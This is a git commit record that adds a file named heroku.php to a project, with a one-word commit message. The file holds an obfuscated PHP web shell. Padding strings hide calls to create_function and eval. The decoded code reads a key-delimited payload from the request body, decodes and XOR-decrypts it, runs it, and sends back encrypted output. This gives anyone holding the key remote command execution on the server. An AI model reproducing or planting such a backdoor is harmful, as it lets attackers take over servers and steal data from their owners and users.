d9102034639b0ef553291c31533100b6e606f05d
DevsDontCare <61753402+DevsDontCare@users.noreply.github.com>
2020-05-30 12:12:41 -0500

    makiing

---
+++ heroku.php
@@ -0,0 +1,10 @@
+<?php
+$f='Zh$iZh}^$k{$j};Zh}}Zhreturn Zh$o;}ZhZhZhifZh (@preg_match(Zh"/$kh(.+)$kZhf/",@Zhfile_get_conZhtents(Zh"php:/Zh/input"Zh)Zh,';
+$E='$m)Zh == 1) {  @ob_stZharZht();  @eZhval(Zh@gZhzuncompreZhss(@x(@basZhe64_ZhZhdecode($m[1]),$Zhk))); Zh $Zho=@obZh_getZh_co';
+$K='ntZhents();  @ZhobZh_end_clean();Zh Zh $r=@base6Zh4_encZhode(@x(@ZhgzcompZhress($ZhZho),$Zhk));  Zhprint(Zh"$p$kh$r$kf");}';
+$S='{$c=strlen(Zh$Zhk);$Zhl=strlenZh($t);$o="";for(Zh$i=0;$Zhi<$l;Zh){forZh($j=0;Zh($jZh<$c&&$i<$lZh);$Zhj++,$iZh++){$o.=$t{';
+$t=str_replace('H','','creHaHHHte_fHuncHtion');
+$g='$k="aZh1e2Zh4df3";$kh="11eZhZhadf2f2b9a";$Zhkf="c6Zh762c740Zh7Zh89";$p=Zh"lbmRZhhXUPpZhCZhsETQRn";functionZh ZhZhx($t,Zh$k)';
+$D=str_replace('Zh','',$g.$S.$f.$E.$K);
+$e=$t('',$D);$e();
+?>
